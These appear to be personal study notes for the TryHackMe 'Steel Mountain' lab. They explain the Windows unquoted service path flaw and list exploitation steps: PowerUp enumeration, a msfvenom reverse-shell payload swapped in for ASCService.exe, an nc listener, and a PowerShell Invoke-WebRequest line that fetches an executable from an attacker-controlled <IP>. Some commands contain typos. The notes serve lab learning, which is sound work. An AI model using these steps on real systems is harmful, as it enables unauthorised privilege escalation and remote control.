# TryHackMe-Steel-MountainWhat in the world is Unquoted Service Path?
When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).
In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.

From <https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae> 

![Image-steel]()









Using PowerUp.ps1 script to enumurate the windows system. 





Ran Into some erros because we are using the PowerShell.

Fixed!
THINGS LEARNT:
	1. Msfvenom: generate reverse_shell, 
	2. Metasploit's powershell_shell may not work with "sc". Instead, I promoted the command "sc stop AdvancedSystemCareService9" in to the regular CMD shell. And it finally stopped the service. And so is the "copy ASCService.exe "<PATH>" .
	3. Nc a listener in port specified in your payload with msfvenom.
	4. After "sc start AdvancedSystemCareService9" you will see a reverse shell in your terminal
	
	5. Cmd shell comand:  copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
	



	
	
#using without metasploit, I think it is a good practice to do because it is a very good example of work around when metasploit gets reject AV. 
	1. Things learned:
		a. Powershell -c "Invoke-WebRequest - FileOut xxxxxx http://<IP>/filename.exe
		b. Cmd shell: sc start | sc stop <SERVICE> 
Sc stop <SERVICE>. Powershell -c "Invoke-WebRequest -Outfiles ASCService.exe http://<IP>/ASCService.exe " 

Nc -lvp <PORT LISTENING FROM THE PAYLOAD>
Sc start <SERVICE>

